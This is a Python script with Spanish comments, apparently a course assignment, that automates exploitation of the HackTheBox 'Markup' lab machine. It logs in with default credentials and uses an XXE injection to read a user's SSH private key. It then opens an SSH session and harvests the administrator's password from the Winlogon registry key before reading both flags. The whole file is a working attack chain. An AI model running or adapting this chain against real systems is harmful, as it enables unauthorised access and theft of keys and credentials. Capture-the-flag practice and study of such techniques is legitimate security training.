##tarea6: automatización de la explotación de Markup en hackthebox

import requests
import urllib
import argparse
import re
import paramiko
import io

#uso de credenciales por default
user = "admin"
password = "password"


##Función que realiza una conexión al sitio vulnerable de acuerdo a la IP, usuario y password.
##Se reconoce si las credenciales son correctas de acuerdo al mensaje de respuesta recibido. 
##Se agrega control de errores.
def Autenticacion(ip, user, password):
    s = requests.Session()
    data = {"username":user, "password": password}
    urlLogin = f"http://{ip}"
    try:
        req = s.post(urlLogin, data=data, allow_redirects=True)
        #print(req.text)
    except Exception as e:
        print(f"Error al conectar con el host: {e}")
        exit()
    #validar mediante un mensaje de la respuesta que la autenticación fue exitosa
    print('Probando credenciales: '+user +':' +password)
    if "Welcome to our store" in req.text:
        print("¡¡¡¡¡¡¡¡Ingreso exitoso!!!!!!!!")
        # extracción de la llave privada del usuario
        xxe(s,ip)
    elif "Invalid credentials or user not activated" in req.text:
        print("Invalid credentials")
    else:
        print("Hubo un problema")

##xxe
##realiza una inyección XXE. 
##La inyección xxe explota un LFI, en este caso el archivo .ssh/id_rsa.
def xxe(s,ip):
    #inyección que extrae la llave privada del usuario Daniel
    payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///C:/Users/Daniel/.ssh/id_rsa\"> ]><order><quantity>1</quantity><item>&xxe;</item><address>holahola</address></order>"
    url = f"http://{ip}/process.php"
    cookie = {'PHPSESSID':'7pq4p5797aved1qou0elktrdgl'}
    r = s.post(url, data=payload, cookies=cookie)
    #print(r.text)
    #validación basada en si existe el texto en la respuesta
    if "BEGIN OPENSSH" in r.text:
        print("Copiando llave privada")
        #se filtra la llave privada del usuario Daniel usando expresiones regulares
        regex = r'Your order for (.*) has been processed'
        daniel_idrsa = re.findall(regex, r.text, re.DOTALL)
        daniel_idrsa = ''.join(daniel_idrsa)
        print(daniel_idrsa)
        #se usa la llave privada para crear conexión ssh al servidor
        print("creando conexión")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        private_key = paramiko.RSAKey.from_private_key(io.StringIO(daniel_idrsa))
        ssh.connect(ip, username='daniel', pkey=private_key)
        stdin, stdout, stderr = ssh.exec_command('type C:\\Users\\Daniel\\Desktop\\user.txt ')
        output = stdout.readlines()
        #flag de user Daniel
        print("[+] - Flag de user : C:\\Users\\Daniel\\Desktop\\user.txt:\n", output[0])

        #búsqueda y extracción de credenciales de Administrador usando expresiones regulares
        stdin,stdout,stderr= ssh.exec_command('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"')
        output = stdout.readlines()
        regex = r'DefaultPassword\s+REG_SZ\s+(.*)'
        output=' '.join(output)
        adminpass = re.search(regex, output)
        if adminpass:
            adminpass=adminpass.group(1)
            print("El valor de DefaultPassword para Administrador es:", adminpass)
        else:
            print("No se encontró el valor de DefaultPassword en el texto.")       
        ssh.close()

        #nueva conexión con usuario Administrator y lectura de flag
        print("creando conexión para el usuario Administrator")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        #sanitización de la variable
        adminpass=adminpass.strip()
        ssh.connect(ip, username='Administrator', password=adminpass)
        stdin, stdout, stderr = ssh.exec_command('type C:\\Users\\Administrator\\Desktop\\root.txt ')
        output = stdout.readlines()
        #flag de root
        print("[+] - Flag de usuario root : C:\\Users\\Administrador\\Desktop\\root.txt:\n", output[0])
        ssh.close()

    else:
        print("No se encontró el archivo")

##En la función principal se controlan los argumentos recibidos y se hace la Autenticación de acuerdo al usuario y contraseña configurado.
def main():
    parser = argparse.ArgumentParser(description='Automatización de máquina Markup en hackthebox')
    parser.add_argument('--ip', metavar='IP', type=str, required=True, help='La dirección IP del servidor')
    args = parser.parse_args()

    print("[+] - Iniciando")
    Autenticacion(args.ip, user, password)
    print("[+] - Finalizado")
if __name__ == "__main__":
    main()
